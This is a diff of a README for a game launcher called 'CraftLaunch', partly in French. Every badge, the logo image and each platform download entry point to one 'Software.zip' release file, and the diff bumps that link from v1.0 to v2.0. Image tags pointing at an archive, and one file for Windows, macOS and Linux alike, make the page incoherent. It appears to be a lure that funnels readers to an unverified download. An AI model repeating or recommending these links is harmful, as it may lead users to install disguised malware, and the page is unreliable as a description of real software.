@@ -1,18 +1,18 @@
-<p align="center"><img src="https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip" alt="icon-launcher"></p>
+<p align="center"><img src="https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip" alt="icon-launcher"></p>
 
 <h1 align="center">CraftLaunch</h1>
 
 [<p align="center">]()
-![GitHub all releases](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip)
-![Discord](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip)
-![GitHub https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip version](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip)
+![GitHub all releases](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip)
+![Discord](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip)
+![GitHub https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip version](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip)
 [<p align="center">]()
-![GitHub forks](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip)
-![GitHub Repo stars](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip)
+![GitHub forks](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip)
+![GitHub Repo stars](https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip)
 
 <p align="center">
-    <a href="https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip">
-        <img src="https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip">
+    <a href="https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip">
+        <img src="https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip">
     </a>
 </p>
 
@@ -72,9 +72,9 @@ Si vous téléchargez à partir des Releases, sélectionnez le programme d'insta
 
  Plateforme | Fichier |
 | -------- | ---- |
-| Windows x64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip ` |
-| macOS x64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip` |
-| macOS arm64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip` |
-| Linux x64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v1.0/Software.zip` |
+| Windows x64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip ` |
+| macOS x64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip` |
+| macOS arm64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip` |
+| Linux x64 | `https://github.com/Mzey1452/BitoCraft-Launcher/releases/download/v2.0/Software.zip` |
 
 ---
